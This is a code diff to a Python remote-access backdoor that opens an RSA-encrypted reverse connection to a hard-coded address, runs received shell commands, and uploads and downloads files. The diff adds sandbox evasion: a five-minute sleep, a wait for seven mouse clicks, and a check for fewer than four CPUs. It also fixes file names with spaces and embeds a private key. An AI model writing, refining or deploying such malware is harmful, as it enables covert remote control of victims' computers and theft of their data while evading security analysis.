@@ -1,7 +1,8 @@
-import socket,subprocess,os,time,tempfile
+import socket,subprocess,os,time,tempfile,multiprocessing
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP
 from mss import mss
+from pynput.mouse import Listener
 MAX = 1024
 
 class Backdoor:
@@ -74,7 +75,20 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
 -----END RSA PRIVATE KEY-----'''
         self.IP = IP
         self.PORT = PORT
-        self.connect(self.IP, self.PORT)
+        self.click = 0
+
+    def onclick(self, x, y, button, pressed):
+        if pressed:
+            self.click += 1
+            if self.click == 7:
+                self.listener.stop()
+
+    def evade(self):
+        time.sleep(300)
+        with Listener(on_click=self.onclick) as self.listener:
+            self.listener.join()
+        if multiprocessing.cpu_count() < 4:
+            self.evade()
 
     def encrypt(self, msg):
         public_key = RSA.importKey(self.publickey)
@@ -100,7 +114,6 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
     
             
     def exec_cmd(self, cmd):
-        # DEVNULL = open(os.devnull,"wb")
         res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
         stdout = res.stdout.read().decode().strip()
         stderr = res.stderr.read().decode().strip()
@@ -108,6 +121,8 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
             return (stdout)
         elif stderr:
             return (stderr)
+        else:
+            return ''
     
     def r_send(self, msg):
         msg = msg.encode()
@@ -181,6 +196,7 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
 
 
     def run(self):
+        self.connect(self.IP, self.PORT)
         while(True):
             try:
                 cmd = self.r_recv()
@@ -188,9 +204,11 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
                 if cmd[0] == "cd" and len(cmd)>1:
                     self.change_dir(cmd[1])
                 elif cmd[0] == "download":
-                    self.upload(cmd[1])
+                    filename = filename = ' '.join(cmd[1:])
+                    self.upload(filename)
                 elif cmd[0] == "upload":
-                    self.download(cmd[1])
+                    filename = filename = ' '.join(cmd[1:])
+                    self.download(filename)
                 elif cmd[0] == "terminate":
                     self.connect(self.IP, self.PORT)
                 elif cmd[0] == "clear":
@@ -219,4 +237,5 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
 
 
 backdoor = Backdoor("192.168.1.99",2000)
+backdoor.evade()
 backdoor.run()
